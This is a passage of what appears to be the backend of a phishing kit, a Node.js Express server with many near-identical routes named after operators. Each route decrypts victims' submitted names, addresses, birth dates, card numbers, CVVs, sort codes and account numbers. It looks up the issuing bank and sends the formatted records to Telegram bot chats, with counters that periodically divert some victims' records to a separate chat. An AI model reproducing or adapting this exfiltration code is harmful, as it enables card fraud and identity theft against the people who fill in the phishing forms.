  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Apple:\n${originalText}`
        );
        kelvCount += 1;
      }
    });
});

var swipesC = 0;

app.post("/swipesApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (swipesC == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        swipesC = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSwipes:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5348269876&text=Apple:\n${originalText}`
        );
        swipesC += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/daangerApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (daanger == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        daanger = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleDaanger:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=637332768&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.post("/fpaysApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFpays:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 2134201699,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC += 1;
      }
    });
});

var ciscoCount = 6;

app.post("/ciscoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ip = req.body.ip;
  userAgent = req.body.userAgent;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalTextHaytch = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ciscoCount == 12) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalTextHaytch}`
        );
        ciscoCount = 7;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCisco:\n${originalTextHaytch}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1911692807&text=Apple:\n${originalTextHaytch}`
        );
        ciscoCount += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/onlymyApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleOnlyMy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=Apple:\n${originalText}`
        );
        TheOnlyMY += 1;
      }
    });
});

let nchroCount = 10;

app.post("/nchroApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (nchroCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        nchroCount = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleNchro:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5108525724,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        nchroCount += 1;
      }
    });
});

app.post("/chasedabag24s", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cdbCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        cdbCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCDB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=911916233&text=Apple:\n${originalText}`
        );
        cdbCount += 1;
      }

      res.send("Update Completed");
    });
});

let clearstore = 0;

app.post("/baliApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBali:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
